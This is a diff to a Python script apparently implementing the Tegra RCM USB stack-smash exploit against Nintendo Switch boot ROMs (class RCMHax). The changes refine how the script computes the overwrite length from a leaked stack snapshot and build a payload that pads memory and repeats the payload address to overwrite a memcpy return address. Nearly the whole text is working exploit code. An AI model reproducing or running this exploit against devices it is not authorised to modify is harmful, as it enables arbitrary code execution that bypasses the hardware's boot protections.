@@ -491,6 +491,9 @@ class RCMHax:
         # self.dev = "lol"
 
         self.overwrite_len = None
+        self.EndpointStatus_stack_addr = None
+        self.ProcessSetupPacket_SP = None
+        self.InnerMemcpy_LR_stack_addr = None
 
         # If we don't have a device...
         if self.dev is None:
@@ -589,13 +592,13 @@ class RCMHax:
         if self.overwrite_len is None:
             stack_snapshot = self.read_stack()
             print("Stack snapshot: {}".format(binascii.hexlify(stack_snapshot)))
-            EndpointStatus_stack_addr = struct.unpack('<I', stack_snapshot[0xC:0xC+4])[0]
-            print("EndpointStatus_stack_addr: 0x{:08x}".format(EndpointStatus_stack_addr))
-            ProcessSetupPacket_SP = EndpointStatus_stack_addr - 0xC
-            print("ProcessSetupPacket SP: 0x{:08x}".format(ProcessSetupPacket_SP))
-            InnerMemcpy_LR_stack_addr = ProcessSetupPacket_SP - 2 * 4 - 2 * 4
-            print("InnerMemcpy LR stack addr: 0x{:08x}".format(InnerMemcpy_LR_stack_addr))
-            self.overwrite_len = InnerMemcpy_LR_stack_addr - 0x40005000
+            self.EndpointStatus_stack_addr = struct.unpack('<I', stack_snapshot[0xC:0xC+4])[0]
+            print("EndpointStatus_stack_addr: 0x{:08x}".format(self.EndpointStatus_stack_addr))
+            self.ProcessSetupPacket_SP = self.EndpointStatus_stack_addr - 0xC
+            print("ProcessSetupPacket SP: 0x{:08x}".format(self.ProcessSetupPacket_SP))
+            self.InnerMemcpy_LR_stack_addr = self.ProcessSetupPacket_SP - 2 * 4 - 2 * 4
+            print("InnerMemcpy LR stack addr: 0x{:08x}".format(self.InnerMemcpy_LR_stack_addr))
+            self.overwrite_len = self.InnerMemcpy_LR_stack_addr - self.COPY_BUFFER_ADDRESSES[1]
             print("overwrite_len: 0x{:08x}".format(self.overwrite_len))
         return self.overwrite_len
 
@@ -693,12 +696,14 @@ intermezzo = None
 intermezzo_size = None
 with open(intermezzo_path, "rb") as f:
     intermezzo = f.read()
-    intermezzo_size = len(intermezzo)
+intermezzo_size = len(intermezzo)
+print("intermezzo_size: 0x{:08x}".format(intermezzo_size))
 target_payload = None
 target_payload_size = None
 with open(payload_path, "rb") as f:
     target_payload = f.read()
-    target_payload_size = len(target_payload)
+target_payload_size = len(target_payload)
+print("target_payload_size: 0x{:08x}".format(target_payload_size))
 
 # Print the device's ID. Note that reading the device's ID is necessary to get it into
 try:
@@ -742,7 +747,14 @@ payload += patched_intermezzo
 payload_first_length = switch.get_payload_first_length(intermezzo_size, target_payload_size)
 payload += target_payload[:payload_first_length]
 
-overwrite_payload_off = switch.get_overwite_payload_off(intermezzo_size)
+
+overwrite_len = switch.get_overwrite_length()
+print("overwrite_len: 0x{:08x}".format(overwrite_len))
+payload_overwrite_len = overwrite_len - (RCM_PAYLOAD_ADDR - switch.EndpointStatus_stack_addr)
+print("payload_overwrite_len: 0x{:08x}".format(payload_overwrite_len))
+
+overwrite_payload_off = payload_overwrite_len - intermezzo_size
+print("overwrite_payload_off: 0x{:08x}".format(overwrite_payload_off))
 smash_padding = 0
 if payload_first_length < overwrite_payload_off:
     smash_padding = overwrite_payload_off - payload_first_length - 0x100
@@ -750,6 +762,15 @@ print("smash_padding: 0x{:08x}".format(smash_padding))
 payload += b'\0' * smash_padding
 
 payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * 0x4000)
+
+# overwrite_payload_off = switch.get_overwite_payload_off(intermezzo_size)
+# smash_padding = 0
+# if payload_first_length < overwrite_payload_off:
+#     smash_padding = overwrite_payload_off - payload_first_length - 0x100
+# print("smash_padding: 0x{:08x}".format(smash_padding))
+# payload += b'\0' * smash_padding
+
+# payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * 0x4000)
 
 payload_second_length = switch.get_payload_second_length(intermezzo_size, target_payload_size)
 
